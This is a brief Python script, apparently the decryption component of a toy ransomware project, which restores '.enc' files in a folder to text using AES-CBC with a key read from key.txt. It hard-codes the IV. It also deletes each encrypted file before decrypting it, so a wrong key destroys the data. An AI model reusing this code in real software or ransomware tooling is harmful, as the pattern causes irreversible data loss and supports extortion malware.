import glob
import os
from base64 import b64encode
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

#delete .enc files and create new text files with decrypted data

try:
   iv = b"secretbase123456" #hard coded initial vector

   file_in = open("key.txt","rb") #open file where decrypted key is
   key = file_in.read()
   dec_key = b64decode(key) #decode base 64 encoded key
   file_in.close()

   for victim_file in glob.glob("*.enc"): #for any .enc file

        file_in = open(victim_file, "rt")
        data = file_in.read() #read in cipher text
        file_in.close()
        os.remove(victim_file) #remove .enc file
    
        victim_file = victim_file.replace('.enc','.txt') #replace .enc in file name with .txt
        
        ct = b64decode(data) #decode cipher text
        cipher = AES.new(dec_key, AES.MODE_CBC, iv) #decrypt cipher text
        pt = unpad(cipher.decrypt(ct), AES.block_size)

        file_out = open(victim_file, "wt+") #write decrypted cipher text to new text file
        file_out.write(pt.decode('utf-8')) #decode base 64 text
        file_out.close()

except ValueError:
   print("Incorrect decryption")
except KeyError:
   print("Incorrect Key")

